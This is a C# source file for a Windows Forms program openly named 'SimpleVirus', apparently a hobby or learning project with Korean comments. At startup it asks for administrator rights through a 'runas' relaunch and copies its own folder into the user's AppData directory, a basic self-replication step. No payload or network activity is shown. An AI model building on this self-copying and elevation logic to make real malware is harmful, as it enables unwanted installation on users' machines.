using System.Diagnostics;
using System.Security.Principal;

namespace SimpleVirus
{
    internal static class Program
    {
        public static string ApplicationName { get; } = "SimpleVirus";
        public static string ApplicationVersion { get; } = "1.0.0";


        /// <summary>
        /// 프로그램 시작지점
        /// </summary>
        [STAThread]
        public static void Main()
        {
            Initialize();

            ApplicationConfiguration.Initialize();
            Application.Run(new MainForm());
        }

        /// <summary>
        /// 프로그램 초기화 함수
        /// </summary>
        private static void Initialize()
        {
            string workDir = Path.Combine(Environment.GetFolderPath(
                Environment.SpecialFolder.ApplicationData), ApplicationName);

            if (Application.StartupPath != workDir)
            {
                SelfReplication(workDir);
            }
        }

        /// <summary>
        /// 프로그램을 다른위치로 복사
        /// </summary>
        /// <param name="destinationDir">도착할 위치</param>
        private static void SelfReplication(string destinationDir)
        {
            if (IsAdministrator() == false)
            {
                try
                {
                    ProcessStartInfo info = new()
                    {
                        UseShellExecute = true,
                        FileName = Application.ExecutablePath,
                        Verb = "runas"
                    };

                    Process.Start(info);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ApplicationName,
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Application.Exit();
                }
            }
            else
            {
                CopyDirectory(Application.StartupPath, destinationDir, true);
            }
        }

        /// <summary>
        /// 폴더를 다른 위치로 복사
        /// </summary>
        /// <param name="sourceDir">복사할 폴더 위치</param>
        /// <param name="destinationDir">도착할 폴더 위치</param>
        /// <param name="recursive">재귀적 실행</param>
        private static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
        {
            DirectoryInfo dirInfo = new(sourceDir);

            if (!dirInfo.Exists )
                return;

            DirectoryInfo[] dirs = dirInfo.GetDirectories();
            Directory.CreateDirectory(destinationDir);

            foreach (FileInfo file in dirInfo.GetFiles())
            {
                string targetFilePath = Path.Combine(destinationDir, file.Name);
                file.CopyTo(targetFilePath);
            }

            if (recursive)
            {
                foreach (DirectoryInfo subDir in dirs)
                {
                    string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
                    CopyDirectory(subDir.FullName, newDestinationDir, true);
                }
            }
        }

        /// <summary>
        /// 관리자 권한 여부 확인
        /// </summary>
        /// <returns>관리자 권한 여부</returns>
        private static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            
            if (identity != null)
            {
                WindowsPrincipal principal = new(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }

            return false;
        }
    }
}
